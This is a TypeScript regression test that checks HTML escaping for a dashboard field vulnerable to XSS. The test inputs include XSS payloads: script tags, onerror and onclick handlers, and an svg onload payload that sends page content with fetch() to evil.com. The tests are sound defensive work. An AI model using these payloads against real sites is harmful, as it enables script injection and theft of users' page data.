import { describe, it } from "node:test";
import assert from "node:assert/strict";

/**
 * Regression test for XSS vulnerability in dashboard workflow_id rendering.
 * 
 * Vulnerability: The workflow_id field was directly inserted into panel.innerHTML
 * without escaping, allowing attackers to inject arbitrary HTML/JavaScript.
 * 
 * Fix: Wrap workflow_id with esc() function (already used for other fields like task).
 */

describe("Dashboard XSS Protection", () => {
  // Replicate the esc() function from index.html
  function esc(s: string | undefined | null): string {
    if (!s) return "";
    return s
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  it("should escape HTML tags in workflow_id", () => {
    const maliciousWorkflowId = "<script>alert('XSS')</script>";
    const escaped = esc(maliciousWorkflowId);
    
    // Verify that HTML tags are converted to entities
    assert.strictEqual(escaped, "&lt;script&gt;alert('XSS')&lt;/script&gt;");
    
    // Ensure the dangerous characters are not present
    assert(!escaped.includes("<script>"));
    assert(!escaped.includes("</script>"));
  });

  it("should escape event handler attributes in workflow_id", () => {
    const maliciousWorkflowId = '"><img src=x onerror="alert(\'XSS\')">';
    const escaped = esc(maliciousWorkflowId);
    
    // Verify dangerous HTML tags and quotes are escaped
    assert(!escaped.includes('">'));  // closing quote and bracket must be escaped
    assert(!escaped.includes("<img")); // opening tag must be escaped
    assert(escaped.includes("&quot;"));  // quotes should be escaped
    assert(escaped.includes("&lt;"));    // < must be escaped
    assert(escaped.includes("&gt;"));    // > must be escaped
    
    // The key point: the escaped string cannot be parsed as HTML
    // When put in innerHTML, it will render as text, not as HTML
  });

  it("should escape quotes in workflow_id", () => {
    const maliciousWorkflowId = '" onclick="alert(\'XSS\')" foo="';
    const escaped = esc(maliciousWorkflowId);
    
    // All quotes should be escaped to &quot;
    assert(!escaped.includes('"'));
    assert(escaped.includes("&quot;"));
  });

  it("should escape ampersands in workflow_id", () => {
    const workflowId = "workflow&test";
    const escaped = esc(workflowId);
    
    assert.strictEqual(escaped, "workflow&amp;test");
  });

  it("should handle empty or null workflow_id safely", () => {
    assert.strictEqual(esc(null), "");
    assert.strictEqual(esc(undefined), "");
    assert.strictEqual(esc(""), "");
  });

  it("should allow safe characters in workflow_id", () => {
    const safeWorkflowId = "my-workflow-123_test";
    const escaped = esc(safeWorkflowId);
    
    // Safe characters should pass through unchanged
    assert.strictEqual(escaped, safeWorkflowId);
  });

  it("should escape complex XSS payload combining multiple vectors", () => {
    const complexPayload = '"><svg onload="fetch(\'http://evil.com/steal?data=\'+document.body.innerHTML)">';
    const escaped = esc(complexPayload);
    
    // All dangerous characters should be escaped
    assert(!escaped.includes('">'));  // closing quote and bracket
    assert(!escaped.includes("<svg")); // opening tag
    
    // Verify the string is properly entity-encoded
    assert(escaped.includes("&quot;"));  // quotes escaped
    assert(escaped.includes("&lt;"));    // < escaped
    assert(escaped.includes("&gt;"));    // > escaped
    
    // When this escaped value is placed in innerHTML/h2, 
    // all HTML tags are escaped so they render as text
  });

  it("should prevent HTML injection via workflow_id in innerHTML context", () => {
    const workflowId = "<h2>Injected Header</h2>";
    const escaped = esc(workflowId);
    
    // When this escaped value is placed in innerHTML, it should render as text
    const testDiv = '<h2>' + escaped + '</h2>';
    
    // The inner content should be escaped, preventing HTML parsing
    assert(testDiv.includes("&lt;h2&gt;"));
    assert(!testDiv.includes("<h2>Injected"));
  });

  it("should render escaped workflow_id safely when used in panel.innerHTML", () => {
    // Simulate the actual dashboard code
    const run = {
      workflow_id: '"><script>alert("XSS")</script><h2 style="',
      task: "Some task"
    };
    
    const escaped_workflow_id = esc(run.workflow_id);
    const escaped_task = esc(run.task);
    
    // This is how the dashboard would render it
    const panelHTML = `
      <button class="panel-close" onclick="closePanel()">✕</button>
      <h2>${escaped_workflow_id}</h2>
      <div class="panel-task">${escaped_task}</div>
    `;
    
    // Verify that when we parse this HTML, the workflow_id is safe
    assert(!panelHTML.includes('"><script>'));
    assert(!panelHTML.includes('<script>'));
    assert(panelHTML.includes("&lt;script&gt;"));
  });
});
